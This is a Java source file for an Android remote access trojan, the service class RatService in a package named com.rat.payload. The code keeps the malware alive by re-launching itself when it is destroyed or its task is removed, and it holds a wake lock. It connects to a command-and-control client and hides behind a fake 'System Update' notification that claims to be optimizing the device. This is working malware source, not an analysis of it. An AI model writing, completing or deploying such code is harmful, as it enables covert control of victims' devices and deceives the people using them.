package com.rat.payload.core;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.rat.payload.MainActivity;
import com.rat.payload.R;
import com.rat.payload.network.C2Client;

public class RatService extends Service {

    private static final String TAG = "RatService";
    private static final int NOTIF_ID = 1;
    private C2Client c2Client;
    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();
        c2Client = new C2Client(this);
        acquireWakeLock();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(NOTIF_ID, buildNotification());
        c2Client.connect();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (c2Client != null) c2Client.disconnect();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        Intent restartIntent = new Intent(getApplicationContext(), RatService.class);
        startService(restartIntent);
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Intent restartIntent = new Intent(getApplicationContext(), RatService.class);
        startService(restartIntent);
        super.onTaskRemoved(rootIntent);
    }

    private Notification buildNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 0, intent, PendingIntent.FLAG_IMMUTABLE);
        return new NotificationCompat.Builder(this, RatApp.CHANNEL_ID)
            .setContentTitle("System Update")
            .setContentText("Optimizing device performance...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(true)
            .build();
    }

    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (pm != null) {
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, TAG);
            wakeLock.acquire(10 * 60 * 1000L);
        }
    }
}
